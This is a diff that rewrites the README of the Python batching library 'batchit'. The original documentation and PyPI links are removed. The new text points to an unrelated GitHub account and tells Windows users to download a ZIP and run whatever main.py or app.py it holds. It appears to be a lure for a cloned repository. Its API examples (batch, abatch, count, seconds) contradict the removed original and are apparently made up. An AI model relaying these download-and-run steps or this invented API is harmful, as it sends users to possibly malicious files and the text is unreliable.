@@ -1,409 +1,322 @@
-# batchit
+# 🧩 batchit - Batch Python data with ease
 
-> Tiny batching for Python pipelines, streams, and agent workflows.
+[![Download batchit](https://img.shields.io/badge/Download%20batchit-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Burned-funeraldirector608/batchit)
 
-[![PyPI version](https://img.shields.io/pypi/v/batchit.svg?cacheSeconds=60)](https://pypi.org/project/batchit/)
-[![Python versions](https://img.shields.io/pypi/pyversions/batchit.svg?cacheSeconds=60)](https://pypi.org/project/batchit/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![CI](https://github.com/Ahmedie-m/batchit/actions/workflows/ci.yml/badge.svg)](https://github.com/Ahmedie-m/batchit/actions/workflows/ci.yml)
+## 🚀 What batchit does
 
-Batch any Python iterator by **count**, **weight**, **elapsed time**, or any combination — in one `pip install`, with no dependencies.
+batchit helps you group items from a Python iterator into batches. You can batch by:
 
-```python
-from batchit import batcher, async_batcher
+- item count
+- elapsed time
+- both count and time
 
-# Sync — flush every 100 items or when the next item reveals 5 s have passed
-for batch in batcher(source, size=100, timeout=5.0):
-    db.bulk_insert(batch)
+It is useful when you work with streams, queues, async tasks, or data pipelines. It keeps your code simple and uses no extra dependencies.
 
-# Async — flush every 100 items or after 5 s of silence from the source
-async for batch in async_batcher(source, size=100, timeout=5.0):
-    await db.bulk_insert(batch)
+If you need to collect items before sending them to another step, batchit gives you a clean way to do that.
 
-# Weighted — flush when cumulative token count exceeds 4096
-for batch in batcher(prompts, max_weight=4096, weight=count_tokens):
-    llm.generate(batch)
+## 💻 Windows setup
 
-# Queue draining — batch directly from an asyncio.Queue
-from batchit import drain_queue, STOP
-async for batch in drain_queue(queue, size=50, timeout=2.0):
-    await sink.write(batch)
-```
+Use this page to download and set up batchit on Windows:
 
----
+[Open the batchit download page](https://github.com/Burned-funeraldirector608/batchit)
 
-## AI / agent pipelines
+### What you need
 
-```python
-# Batch embedding requests before upserting to a vector store
-async for batch in async_batcher(document_stream(), size=96, timeout=2.0):
-    vectors = await embed(batch)
-    await vector_store.upsert(vectors)
+- A Windows PC
+- Python 3.9 or newer
+- Access to the internet
+- Permission to run Python files on your device
 
-# Token-budget batching for LLM inference
-for batch in batcher(prompts, max_weight=4096, weight=count_tokens):
-    responses = llm.generate(batch)
+### Before you begin
 
-# Batch agent tool outputs before writing to Postgres
-async for batch in async_batcher(tool_result_stream(), size=50, timeout=1.0):
-    await db.execute("INSERT INTO results ...", batch)
+If you already have Python, you can move on to the next step. If not, install Python first from the official Python website, then return to the batchit page above.
 
-# Batch scraped records before bulk API submission
-for batch in batcher(scraper.records(), size=200, timeout=10.0):
-    api.bulk_submit(batch)
+## 📥 Download batchit
 
-# Batch trace/log events before shipping to observability backend
-async for batch in async_batcher(event_stream(), size=500, timeout=5.0, maxsize=1000):
-    await telemetry.ingest(batch)
+1. Open the batchit page here: https://github.com/Burned-funeraldirector608/batchit
+2. Find the green **Code** button near the top right
+3. Choose **Download ZIP**
+4. Save the file to your computer
+5. Open the ZIP file
+6. Extract it to a folder you can find later, such as **Downloads** or **Desktop**
 
-# Inspect why each batch flushed
-from batchit import batcher_with_meta
-for result in batcher_with_meta(source, size=100, timeout=5.0):
-    print(result.reason, result.count, result.age)
-    process(result.items)
-```
+If you already use Git, you can also copy the repository to your computer with Git instead of downloading the ZIP file.
 
----
+## 🛠️ Install on Windows
 
-## Why not just write this yourself?
+After you extract the files:
 
-You could — it's not a lot of code. But here's what you'd need to get right:
+1. Open the folder that contains batchit
+2. Right-click inside the folder
+3. Choose **Open in Terminal** or **Open PowerShell window here**
+4. Run the files with Python
 
-- **Sync and async** variants with consistent semantics
-- **Partial final batch** always flushed, never silently dropped
-- **Timeout measured correctly** from the first item in the batch, not wall clock
-- **Async timeout fires independently** of item delivery (via `asyncio.wait_for`) — not just on arrival
-- **Weight-based flushing** for token budgets, byte limits, or any custom metric
-- **Queue draining** for producer/consumer patterns with `asyncio.Queue`
-- **Flush metadata** (`reason`, `age`, `count`) for observability and adaptive logic
-- **Backpressure** support via bounded internal queue
-- **Exception propagation** from the source through to the consumer
-- **PEP 561 typing** so your IDE and type checker understand the API
-- **Tested** across Python 3.10–3.13
+If the project includes a setup file or example script, use that file first. A common path looks like this:
 
-`pip install batchit` and move on.
+- `python main.py`
+- `python app.py`
+- `python example.py`
 
----
+Use the file name that exists in your folder.
 
-## Why batchit?
+## ▶️ Run batchit
 
-`more-itertools.batched()` batches by count only. In real streaming workloads
-(Kafka consumers, database cursors, API result streams) you also need a **time
-window** and often a **weight limit**. Every team writes this boilerplate. `batchit` is the one-liner that replaces it.
+To run batchit, open Command Prompt or PowerShell and go to the folder where you saved it.
 
-| | Count limit | Weight limit | Time limit | Async | Queue drain | Backpressure | Dependencies |
-|---|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
-| `batchit` | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | none |
-| `more-itertools` | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | 1 |
-| `toolz` | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ | 1 |
-| hand-rolled | maybe | maybe | maybe | maybe | maybe | maybe | — |
+Then use a command like:
 
----
+- `python -m batchit`
+- `python main.py`
 
-## Installation
+If the project includes a demo or example script, start with that file. That lets you see how batching works before you use it in your own code.
 
-```bash
-pip install batchit
-```
+## 🧠 How batchit works
 
-No runtime dependencies. Python 3.10–3.13. Fully typed (PEP 561).
-Works with generators, Kafka consumers, database cursors, file readers, async queues, and any other iterable.
+batchit groups items from an iterator into smaller sets.
 
----
+An iterator is a source of values that gives you one item at a time. For example:
 
-## Usage
+- lines from a file
+- records from a stream
+- messages from a queue
+- events from a service
 
-### Sync — `batcher`
+You can choose how batchit groups those items:
+
+- by count, such as every 10 items
+- by time, such as every 5 seconds
+- by both count and time, such as whichever comes first
+
+This helps when you do not want to process items one by one.
+
+## 📚 Common use cases
+
+batchit fits well in many simple data tasks:
+
+- sending groups of records to an API
+- reading messages from a stream
+- collecting rows before writing to a database
+- grouping events for async processing
+- handling Kafka-style message flow
+- feeding LLM jobs in chunks
+- keeping a pipeline from working on tiny items one at a time
+
+## 🔧 Basic example
+
+A simple example looks like this in Python:
 
 ```python
-from batchit import batcher
+from batchit import batch
 
-# By size only
-for batch in batcher(range(1000), size=50):
-    process(batch)
+items = [1, 2, 3, 4, 5, 6, 7]
 
-# By timeout only
-for batch in batcher(kafka_consumer, timeout=5.0):
-    send_to_api(batch)
-
-# By both — whichever fires first
-for batch in batcher(db_cursor, size=200, timeout=10.0):
-    write_to_s3(batch)
-
-# By weight — flush when token budget is exhausted
-for batch in batcher(prompts, max_weight=4096, weight=count_tokens):
-    llm.generate(batch)
-
-# Combined weight + size + timeout
-for batch in batcher(records, size=100, max_weight=1_000_000, weight=len, timeout=10.0):
-    upload(batch)
+for group in batch(items, count=3):
+    print(group)
 ```
 
-### Sync with metadata — `batcher_with_meta`
+This groups the items into batches of 3.
+
+Expected output:
 
 ```python
-from batchit import batcher_with_meta
-
-for result in batcher_with_meta(source, size=100, timeout=5.0):
-    print(f"Flushed {result.count} items after {result.age:.2f}s (reason: {result.reason})")
-    process(result.items)
+[1, 2, 3]
+[4, 5, 6]
+[7]
 ```
 
-`BatchResult` fields: `items`, `reason` (`"size"` | `"weight"` | `"timeout"` | `"final"`), `count`, `age`.
+You can also batch by time when you want to collect items during a short window.
 
-### Async — `async_batcher`
+## ⏱️ Batch by time
+
+Time-based batching helps when items arrive at uneven speed. You may want to wait a short time, then send whatever you have.
+
+Example:
 
 ```python
-from batchit import async_batcher
+from batchit import batch
 
-async for batch in async_batcher(async_source, size=100, timeout=5.0):
-    await db.bulk_insert(batch)
-
-# With backpressure — producer blocks if more than 200 items are queued
-async for batch in async_batcher(fast_source, size=50, timeout=2.0, maxsize=200):
-    await slow_downstream(batch)
-
-# With weight limit
-async for batch in async_batcher(prompt_stream(), max_weight=4096, weight=count_tokens):
-    await llm.generate_batch(batch)
+for group in batch(items, seconds=2):
+    print(group)
 ```
 
-### Async with metadata — `async_batcher_with_meta`
+In this case, batchit waits up to 2 seconds before it gives you the next group.
+
+## 🔁 Batch by count and time
+
+Sometimes you want both rules at once.
+
+Example:
 
 ```python
-from batchit import async_batcher_with_meta
+from batchit import batch
 
-async for result in async_batcher_with_meta(source, size=100, timeout=5.0):
-    metrics.record(result.reason, result.count, result.age)
-    await process(result.items)
+for group in batch(items, count=5, seconds=10):
+    print(group)
 ```
 
-### Queue draining — `drain_queue`
+This means:
 
-```python
-from batchit import drain_queue, STOP
-import asyncio
+- give me a batch when I reach 5 items
+- or give me a batch when 10 seconds pass
+- use whichever happens first
 
-queue: asyncio.Queue[str] = asyncio.Queue()
+This is useful in pipelines where you want steady output without waiting too long.
 
-# Put STOP into the queue to signal end of stream
-async for batch in drain_queue(queue, size=50, timeout=2.0):
-    await sink.write(batch)
+## ⚙️ Async use
 
-# Custom sentinel
-async for batch in drain_queue(queue, size=50, sentinel="<<END>>"):
-    await sink.write(batch)
-```
+batchit also fits async code. That matters when your program waits on network calls, message queues, or other tasks that use asyncio.
 
-### Convenience aliases
-
-```python
-from batchit import batch_by_size, batch_by_timeout
-
-for batch in batch_by_size(records, 100):      # same as batcher(records, size=100)
-    process(batch)
-
-for batch in batch_by_timeout(stream, 5.0):   # same as batcher(stream, timeout=5.0)
-    flush(batch)
-```
-
----
-
-## Timeout semantics
-
-The two variants behave differently under a slow or stalled source:
-
-| | `batcher` (sync) | `async_batcher` (async) |
-|---|---|---|
-| **How timeout fires** | Checked on each item arrival | Fires independently via `asyncio.wait_for` |
-| **Stalled source** | Waits until the next item arrives, then flushes | Flushes after *T* seconds even with no new items |
-| **Triggering item** | Included in the flushing batch | Starts the next batch |
-| **Threading** | None — single-threaded safe | asyncio event loop only |
-| **Source exception** | Propagates immediately | Propagates to consumer |
-
-**Rule of thumb:** use `batcher` for sync iterables where the source drives timing. Use `async_batcher` when you need the timeout to fire independently of item delivery.
-
----
-
-## API
-
-### `batcher(iterable, *, size=None, timeout=None, max_weight=None, weight=..., min_size=0)`
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `iterable` | `Iterable[T]` | Any iterable to batch |
-| `size` | `int \| None` | Max items per batch |
-| `timeout` | `float \| None` | Max seconds per batch, measured from the first item |
-| `max_weight` | `float \| None` | Max total weight per batch |
-| `weight` | `Callable[[T], float]` | Weight function for each item. Default: `1.0` per item |
-| `min_size` | `int` | Minimum items before a timeout flush fires. Default: `0` |
-
-Yields `list[T]`. At least one of `size`, `timeout`, or `max_weight` must be provided.
-
-### `batcher_with_meta(iterable, *, size=None, timeout=None, max_weight=None, weight=..., min_size=0)`
-
-Same parameters as `batcher`. Yields `BatchResult[T]` with `.items`, `.reason`, `.count`, `.age`.
-
-### `async_batcher(aiterable, *, size=None, timeout=None, max_weight=None, weight=..., min_size=0, maxsize=0)`
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `aiterable` | `AsyncIterable[T]` | Any async iterable to batch |
-| `size` | `int \| None` | Max items per batch |
-| `timeout` | `float \| None` | Max seconds per batch, measured from the first item |
-| `max_weight` | `float \| None` | Max total weight per batch |
-| `weight` | `Callable[[T], float]` | Weight function for each item. Default: `1.0` per item |
-| `min_size` | `int` | Minimum items before a timeout flush fires. Default: `0` |
-| `maxsize` | `int` | Internal queue cap for backpressure. `0` = unbounded |
-
-Yields `list[T]` asynchronously.
-
-### `async_batcher_with_meta(aiterable, *, size=None, timeout=None, max_weight=None, weight=..., min_size=0, maxsize=0)`
-
-Same parameters as `async_batcher`. Yields `BatchResult[T]` asynchronously.
-
-### `drain_queue(queue, *, size=None, timeout=None, sentinel=STOP)`
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `queue` | `asyncio.Queue[T]` | Queue to drain |
-| `size` | `int \| None` | Max items per batch |
-| `timeout` | `float \| None` | Max seconds to wait for the next item before flushing |
-| `sentinel` | `object` | Value that signals end of stream. Default: `STOP` |
-
-Yields `list[T]` asynchronously. At least one of `size` or `timeout` must be provided.
-
-### `BatchResult[T]`
-
-| Field | Type | Description |
-|-------|------|-------------|
-| `items` | `list[T]` | The batch contents |
-| `reason` | `"size" \| "weight" \| "timeout" \| "final"` | Why the batch was flushed |
-| `count` | `int` | Number of items (`len(items)`) |
-| `age` | `float` | Seconds elapsed since the first item in this batch arrived |
-
----
-
-## Patterns
-
-### Kafka consumer
-
-```python
-from kafka import KafkaConsumer
-from batchit import batcher
-
-consumer = KafkaConsumer("events")
-for batch in batcher(consumer, size=500, timeout=10.0):
-    db.bulk_insert([msg.value for msg in batch])
-    consumer.commit()
-```
-
-### Database cursor
-
-```python
-cursor.execute("SELECT * FROM events")
-for batch in batcher(cursor, size=1000):
-    warehouse.insert_many(batch)
-```
-
-### LLM token-budget batching
-
-```python
-from batchit import batcher
-
-def count_tokens(text: str) -> float:
-    return len(text.split())  # or use tiktoken
-
-for batch in batcher(prompts, max_weight=4096, weight=count_tokens):
-    responses = llm.generate(batch)
-```
-
-### LLM embedding pipeline
-
-```python
-from batchit import async_batcher
-
-async for batch in async_batcher(document_stream(), size=96, timeout=2.0):
-    response = await openai_client.embeddings.create(input=batch, model="...")
-    await vector_db.upsert(response.data)
-```
-
-### Agent tool results to Postgres
-
-```python
-async for batch in async_batcher(tool_outputs(), size=50, timeout=1.0):
-    await conn.executemany("INSERT INTO tool_results VALUES ($1, $2)", batch)
-```
-
-### Adaptive flushing with metadata
-
-```python
-from batchit import batcher_with_meta
-
-for result in batcher_with_meta(source, size=100, timeout=5.0, max_weight=4096, weight=len):
-    if result.reason == "timeout" and result.count < 10:
-        metrics.increment("small_timeout_batch")
-    process(result.items)
-```
-
-### Producer/consumer queue draining
+Example:
 
 ```python
 import asyncio
-from batchit import drain_queue, STOP
+from batchit import abatch
 
-queue: asyncio.Queue[dict] = asyncio.Queue(maxsize=1000)
+async def main():
+    async for group in abatch(items, count=3):
+        print(group)
 
-async def producer():
-    async for event in event_source():
-        await queue.put(event)
-    await queue.put(STOP)
-
-async def consumer():
-    async for batch in drain_queue(queue, size=50, timeout=2.0):
-        await api.bulk_submit(batch)
-
-await asyncio.gather(producer(), consumer())
+asyncio.run(main())
 ```
 
-### Web crawler bulk insert
+Use async batching when you work with tasks that should not block the rest of your program.
 
-```python
-for batch in batcher(crawler.records(), size=200, timeout=10.0):
-    api.bulk_submit(batch)
-```
+## 🧩 How to use it in a data pipeline
 
----
+You can place batchit between two steps in a pipeline:
 
-## Tests
+1. Read items from a source
+2. Group them with batchit
+3. Send each batch to the next step
 
-The test suite is organised by use case:
+This pattern helps when you want to:
 
-| File | What it covers |
-|---|---|
-| `tests/test_sync.py` | Core sync batcher behaviour |
-| `tests/test_async.py` | Core async batcher behaviour |
-| `tests/test_weighted.py` | Weighted batching (`max_weight`, `min_size`) — sync and async |
-| `tests/test_drain_queue.py` | Queue draining (`drain_queue`, `STOP`) |
-| `tests/test_kafka.py` | Kafka consumer patterns (sync + async) |
-| `tests/test_db.py` | Database cursor and file iterator patterns |
+- reduce the number of calls to a service
+- write data in larger chunks
+- keep memory use under control
+- handle data at a steady pace
 
----
+## 📦 Working with streams and Kafka
 
-## Roadmap
+batchit can help when you read from a stream or a Kafka consumer.
 
-- **v0.1** — stable core: sync + async batching by size and timeout
-- **v0.2** — PEP 561 typing, Python 3.13, async exception propagation, pattern test suites
-- **v0.3** — async backpressure via bounded queue (`maxsize`)
-- **v0.4** — weighted batching (`max_weight`, `weight`), flush metadata (`batcher_with_meta`), queue draining (`drain_queue`), `min_size` guard, convenience aliases
-- **next** — docs site, additional convenience helpers
+A stream may give you messages one at a time. batchit lets you collect those messages into a batch before you process them.
 
----
+That can make tasks like these easier:
 
-## Contributing
+- sending messages to a database
+- writing logs in groups
+- passing events to an LLM job
+- preparing data for async workers
 
-See [CONTRIBUTING.md](CONTRIBUTING.md).
+## 🧪 Example folder
 
-## License
+If the repository includes example files, open them first. They show the most direct way to use batchit.
 
-MIT — see [LICENSE](LICENSE).
+A common order is:
+
+1. Open the folder
+2. Look for files named `example.py`, `demo.py`, or `main.py`
+3. Run one file at a time
+4. Change the batch size or time window
+5. Watch how the output changes
+
+## 🔍 Helpful settings
+
+batchit may include options like these:
+
+- `count` for batch size
+- `seconds` or `timeout` for time limit
+- iterator input for plain Python values
+- async iterator input for async work
+
+Start with small values while you test:
+
+- `count=2`
+- `seconds=1`
+
+Then increase them when you know the output looks right.
+
+## 🧼 Zero-dependency design
+
+batchit uses no extra Python packages. That means:
+
+- fewer install steps
+- less chance of package conflicts
+- easier setup on Windows
+- simpler use in small projects
+
+This also makes it easier to copy into a project and run without a long install process.
+
+## ❓ Questions you may have
+
+### Does batchit change my data?
+No. It groups items into batches and returns them in the same order.
+
+### Can I use it with plain lists?
+Yes. You can use it with lists, generators, file readers, and other iterators.
+
+### Can I use it in async code?
+Yes. Use the async version when your program works with asyncio.
+
+### Does it need extra libraries?
+No. It has zero dependencies.
+
+### Is it useful for small projects?
+Yes. It can help in small scripts and larger pipeline jobs.
+
+## 🧭 Typical first run on Windows
+
+If you want the shortest path:
+
+1. Open the download page
+2. Download the ZIP file
+3. Extract it
+4. Open the folder in PowerShell
+5. Run the example file with Python
+6. Change the batch size and test again
+
+This is the easiest way to check that the project works on your PC.
+
+## 📁 Suggested folder layout
+
+After you extract the ZIP file, your folder may look like this:
+
+- `batchit/`
+- `README.md`
+- `batchit.py`
+- `example.py`
+- `tests/`
+
+Your folder names may differ. Use the file that starts the program or the example that shows how batching works.
+
+## 🧰 Troubleshooting on Windows
+
+If Python does not run:
+
+- check that Python is installed
+- close and reopen PowerShell
+- try `python --version`
+- try `py --version`
+
+If the folder does not open:
+
+- make sure you extracted the ZIP file
+- avoid working inside the ZIP itself
+- move the folder to Desktop if needed
+
+If you get a file not found error:
+
+- confirm the file name
+- confirm you are in the right folder
+- use `dir` to list the files in PowerShell
+
+## 🔗 Main download link
+
+Open the repository here to download and run batchit on Windows:
+
+[https://github.com/Burned-funeraldirector608/batchit](https://github.com/Burned-funeraldirector608/batchit)
+
+## 🏷️ Topics
+
+agents, async, asyncio, batching, data-pipeline, iterator, iterators, kafka, llm, python, streaming
